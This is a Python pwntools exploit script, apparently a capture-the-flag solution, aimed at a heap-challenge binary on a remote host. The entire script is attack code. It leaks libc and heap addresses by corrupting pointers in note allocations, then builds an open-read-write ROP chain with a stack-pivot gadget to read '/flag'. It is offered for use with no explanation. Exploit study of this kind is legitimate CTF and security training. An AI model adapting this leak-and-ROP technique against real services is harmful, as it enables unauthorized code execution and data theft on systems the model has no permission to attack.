from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('> ',str(ch))
def new(name,age,msg):
	menu(1)
	p.sendlineafter('name: ',name)
	p.sendlineafter('age: ',str(age))
	p.sendlineafter('message: ',msg)
def note(size,note):
	menu(4)
	p.sendlineafter('size: ',str(size))
	p.sendafter('content: ',note)
p = process('./main')
p = process(['./main'],env={'LD_PRELOAD':'./libc-2.23.so'})
p = remote('183.129.189.60',10000)
context.binary = './main'
elf = ELF('./main')
libc = ELF('./libc-2.23.so')
new('FMYY',16,'FMYY')
menu(2)
note(0x38,p64(0x401D98) + p64(0) + p64(0x603328) + p64(8))
menu(3)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdout_']

new('FMYY',16,'FMYY')
new('FMYY',16,'FMYY')
menu(2)
note(0x38,p64(0x401D98) + p64(0) + p64(0x603340) + p64(8))
menu(3)

p.recvuntil('name :')
heap = u64(p.recv(8))
log.info('HEAP:\t' + hex(heap))

menu(2)
note(0x38,p64(0x401D98) + p64(0) + p64(libc_base + libc.sym['__malloc_hook'] + 0x68) + p64(8))
menu(3)
p.recvuntil('name :')
top = u64(p.recv(8))
log.info('TOP:\t' + hex(top))

for i in range(2):
	note(0x38,'FMYY')
for i in range(4):
	note(0x10,'FMYY')


new('FMYY',16,'FMYY')
menu(2)
note(0x38,p64(0x401D98) + p64(0) + p64(0x603340) + p64(8))
menu(3)
p.recvuntil('name :')
heap2 = u64(p.recv(8))
log.info('HEAP2:\t' + hex(heap2))
menu(3)

magic = 0x603360
Open = libc_base + libc.symbols["openat"]
Read = libc_base + libc.symbols["read"]
Write = libc_base + libc.symbols['write']
Puts = libc_base + libc.sym['puts']
pop_rdi_ret = libc_base + 0x0000000000021112
pop_rsi_ret = libc_base + 0x00000000000202F8
pop_rdx_ret = libc_base + 0x0000000000001B92
leave_ret = libc_base + 0x0000000000042361
ret = pop_rdi_ret + 1
orw  = ''
orw += p64(pop_rdi_ret) + p64(0)
orw += p64(pop_rsi_ret) + p64(leave_ret)
orw += p64(pop_rsi_ret) + p64(magic + 0xA0)
orw += p64(pop_rdx_ret) + p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(0x603400)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(1)
orw += p64(Write)
orw += '/flag\x00\x00'

gadget1 = 0x000000000007371E + libc_base
new('FMYY',16,p64(gadget1) + orw)
menu(2)
note(0x38,p64(magic))
note(0x100,'\x00'*0x58 + p64(magic))
#gdb.attach(p,"b *0x401826")
menu(3)

log.info('LIBC:\t' + hex(libc_base))
p.interactive()
